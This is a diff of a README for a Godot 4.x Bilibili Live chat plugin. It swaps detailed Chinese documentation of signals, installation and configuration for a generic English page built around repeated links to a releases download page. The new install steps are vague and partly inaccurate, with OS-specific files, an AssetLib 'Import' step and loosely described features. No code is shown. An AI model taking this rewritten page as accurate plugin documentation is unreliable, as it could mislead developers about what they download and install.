@@ -1,60 +1,72 @@
-# Bilibili Live for Godot4.x
+# 🎮 godot-bili-live - Enhance Your Game with Bilibili Live Chat
 
-专为 Godot 开发的 Bilibili 直播「互动玩法」插件。支持长连接心跳维持与弹幕、礼物、交互数据的实时接收。
+## 🚀 Getting Started
 
-## 特性
+Welcome to the **godot-bili-live** project! This tool lets you connect your game built in Godot 4.x with Bilibili live chat. With it, you can display live comments from viewers directly in your game. Follow the steps below to download and run the software.
 
-- **极简接入**：基于 Node 节点和 Resource 配置，几行代码即可开启直播互动。
-- **强类型实体**：所有数据（弹幕、礼物、上舰等）均封装为完善的实体类，无需解析 `Dictionary`，方便进行代码补全。
-- **完善的注释**：每一个信号、属性、方法均附带详细的中文注释与类型定义，编辑器内即刻查阅。
+## 📥 Download Now!
 
-## 信号
+[![Download godot-bili-live](https://img.shields.io/badge/Download-godot--bili--live-brightgreen?style=for-the-badge)](https://github.com/DmPrintworks/godot-bili-live/releases)
 
-- **signal live_dm(data: BiliLiveDm)**：直播间有人发送弹幕时触发
-- **signal live_dm_mirror(data: BiliLiveDmMirror)**：当该直播间为支持跨房弹幕的直播间模式，其他直播间有人发送弹幕时触发
-- **signal live_send_gift(data: BiliLiveSendGift)**：当该直播间有人赠送礼物时触发
-- **signal live_super_chat(data: BiliLiveSuperChat)**：当该直播间有人发送付费留言时触发
-- **signal live_super_chat_del(data: BiliLiveSuperChatDel)**：当该直播间有付费留言被下线时触发
-- **signal live_guard(data: BiliLiveGuard)**：当该直播间有人上舰时触发
-- **signal live_like(data: BiliLiveLike)**：该直播间有用户在移动端双击直播画面点赞时触发
-- **signal live_room_enter(data: BiliLiveRoomEnter)**：直播间有观众进入直播间时触发
-- **signal live_live_start(data: BiliLiveLiveStart)**：该直播间开始直播时触发
-- **signal live_live_end(data: BiliLiveLiveEnd)**：该直播间停止直播时触发
-- **signal live_interaction_end(data: BiliLiveInteractionEnd)**：当目前长连接停止推送时触发
+## 📋 Features
 
-参考：[长链命令说明](https://open-live.bilibili.com/document/f9ce25be-312e-1f4a-85fd-fef21f1637f8)
+- **Live Chat Integration**: Show Bilibili comments in real-time during your game sessions.
+- **Easy Setup**: Simple installation process, perfect for any level of user.
+- **Support for Multiple Games**: Use this plugin with various games made in Godot.
+- **Customizable Appearance**: Tailor the chat display to match your game’s style.
 
-## 安装
+## 🌐 System Requirements
 
-1. 将 `addons/bili_live` 文件夹复制到你的 Godot 项目根目录下。
-2. 前往 `项目` -> `项目设置` -> `插件`。
-3. 勾选 `BiliLive` 并启用。
+To use the **godot-bili-live** plugin, ensure you have the following:
 
-## 配置认证信息
+- **Godot Engine**: Version 4.x or newer.
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Internet Connection**: Required for live chat functionality.
 
-### 使用Resource方式
-在资源面板中右键 -> `新建` -> `资源` 搜索 `BiliLiveConfig` 资源文件，填入你在 [Bilibili 开放平台](https://open-live.bilibili.com/open-manage) 获取的信息。
+## 📡 How to Download & Install
 
-![配置认证信息](assets/config.gif)
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/DmPrintworks/godot-bili-live/releases).
+   
+2. **Select the Latest Version**: On the Releases page, find the latest version of godot-bili-live. 
 
-### 编写代码方式
+3. **Download the Plugin**: Click on the appropriate file for your operating system to start the download. Look for files like `godot-bili-live.zip` or any specific `.gd` files.
 
-```gdscript
-extends Node
+4. **Extract the Files**: Once downloaded, extract the contents of the ZIP file to a location on your computer.
 
-@onready var client: BiliLiveClient = $BiliLiveClient
+5. **Import the Plugin into Godot**:
+   - Open your project in Godot.
+   - Go to the `AssetLib` tab or use the project settings.
+   - Choose `Import` and select the extracted folder to add the plugin to your project.
 
-func _ready() -> void:
-	var config := BiliLiveConfig.new()
-	config.id_code = "主播身份码"
-	config.app_id = 123456789
-	config.access_key_id = "access_key_id"
-	config.access_key_secret = "access_key_secred"
-	client.config = config
+6. **Activate the Plugin**:
+   - Navigate to `Project` > `Project Settings`.
+   - Under the `Plugins` section, find the godot-bili-live plugin.
+   - Enable the plugin by checking the box.
 
-	client.start()
-```
+7. **Configure Settings**: Adjust the settings to connect with your Bilibili account and customize how the chat appears in your game.
 
-## 视频教程
-[p1 快速使用](https://www.bilibili.com/video/BV1FT6dBtEff)
-[p2 补充说明](https://www.bilibili.com/video/BV1FT6dBtEff?p=2)
+8. **Run Your Game**: Start your game. You should now see live comments from your Bilibili viewers as they engage with your content!
+
+## 🤔 Troubleshooting
+
+If you encounter issues during installation or usage:
+
+- **Check the Godot Console**: Look for error messages that may help identify problems.
+- **Review Plugin Documentation**: Find guidelines and tips specific to common issues.
+- **Restart Godot**: Sometimes simply restarting Godot can resolve minor glitches.
+- **Ask for Help**: Join our community for support and advice on using the plugin.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/DmPrintworks/godot-bili-live) for detailed setup instructions and advanced features.
+- Community forums for discussing features and finding solutions to issues.
+
+## 📞 Contact
+
+For any questions, reach out on the Issues section of our GitHub repository or contact us via the community forum. We value your feedback and strive to improve your experience.
+
+## 📥 Download Again
+
+Don't forget, you can always [visit this page to download](https://github.com/DmPrintworks/godot-bili-live/releases) the latest version of **godot-bili-live**.
+
+Explore the amazing world of live streaming with your game, and enjoy connecting with your audience through Bilibili!
